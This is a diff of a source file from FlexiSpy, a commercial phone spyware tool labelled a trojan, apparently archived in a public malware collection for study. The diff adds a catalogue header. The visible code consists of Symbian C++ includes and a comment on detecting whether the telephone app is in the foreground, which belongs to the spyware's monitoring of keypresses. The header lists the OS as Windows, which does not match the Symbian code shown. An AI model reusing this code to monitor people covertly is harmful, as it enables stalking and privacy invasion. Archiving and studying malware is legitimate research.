@@ -1,3 +1,14 @@
+/*
+  name      FlexiSpy
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #include "FxKeypressHandler.h"
 #include <aknviewappui.h>	// CAknViewAppUi
 #include "CltPredef.h"
@@ -186,7 +197,7 @@ SEND_EVENT_TO_WINDOWGROUP:
 }
 
 /*
-To determine whether, for example, the telephone application is in the foreground, you can use TApaTaskList and TApaTask. You can find out the topmost application by calling TApaTaskList::FindByPos(0). The function parameter is the window�s ordinal position and zero means the foreground window. The function returns the TApaTask object. You can use it to find out the window group of the application by calling wgId(). After this you can, for example, construct an CApaWindowGroupName object with the window ID returned by the wgId(). The AppUid() function returns the UID of the application. All you need to do is test if it is the same as the UID of the telephone application (0x100058B3).The Window Server also provides some useful functions (see RWsSession).
+To determine whether, for example, the telephone application is in the foreground, you can use TApaTaskList and TApaTask. You can find out the topmost application by calling TApaTaskList::FindByPos(0). The function parameter is the window�s ordinal position and zero means the foreground window. The function returns the TApaTask object. You can use it to find out the window group of the application by calling wgId(). After this you can, for example, construct an CApaWindowGroupName object with the window ID returned by the wgId(). The AppUid() function returns the UID of the application. All you need to do is test if it is the same as the UID of the telephone application (0x100058B3).The Window Server also provides some useful functions (see RWsSession).
 */
 /*void CKeypressHandler::HandleWsEventL(const TWsEvent& aEvent,CCoeControl* aDestination)
 {
